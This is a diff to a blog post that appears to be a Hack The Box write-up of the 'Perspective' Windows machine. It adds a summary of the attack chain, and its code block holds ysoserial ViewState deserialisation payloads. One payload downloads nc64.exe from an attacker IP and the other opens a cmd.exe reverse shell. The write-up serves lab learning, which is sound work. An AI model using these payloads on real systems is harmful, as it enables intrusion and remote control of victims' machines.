@@ -21,6 +21,14 @@ categories:
 series:
   - hack the box
 ---
+Perspective is an insane difficulty Windows machine that focuses on the exploitation of ASP.NET web\
+applications and badly implemented cryptography. Initial access is obtained by reading the application\
+web.config file via a Server-Side Include, which is possible due to a weak filter on file upload. Having\
+retrieved the application machineKey , a new session cookie can be forged to gain administrative rights and access a restricted area, where SSRF can be exploited to access an internal encryption API which uses a weak RC4 implementation, resulting in the decryption of the ViewStateUserKey . Remote command\
+execution is then achieved via deserialisation of a malicious ViewState that can be forged using the obtained application keys. Finally, a padding oracle attack on an internal staging application running with\
+administrative privileges allows to inject OS commands in an encrypted POST parameter, resulting in the\
+elevation of privileges.
+
 ## **Information Gathering on Perspective Machine**
 
 Once we have started the VPN connection which requires a download from Hackthebox, we can start information gathering on the machine by executing the command **nmap -sC -sV -p- <IP Address> -PN**
@@ -222,15 +230,10 @@ As a result, we got a token for it.
 In this step, we are required to run ysoserial command to proceed with the further escalation process.
 
 ```shell
-
-
  -p ViewState -g TextFormattingRunProperties -c "powershell -c Invoke-webrequest -URI 10.10.14.18/nc64.exe -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe" --generator=0414C274 --validationalg="SHA1" --viewstateuserkey="SAltysAltYV1ewSTaT3" --validationkey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"
 
 -p ViewState -g TextFormattingRunProperties -c "C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd.exe 10.10.14.18 443" --generator=0414C274 --validationalg="SHA1" --viewstateuserkey="SAltysAltYV1ewSTaT3" --validationkey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"
-
 ```
-
-
 
 The command above will ensure you guys retrieve a reverse shell on the netcat terminal
 
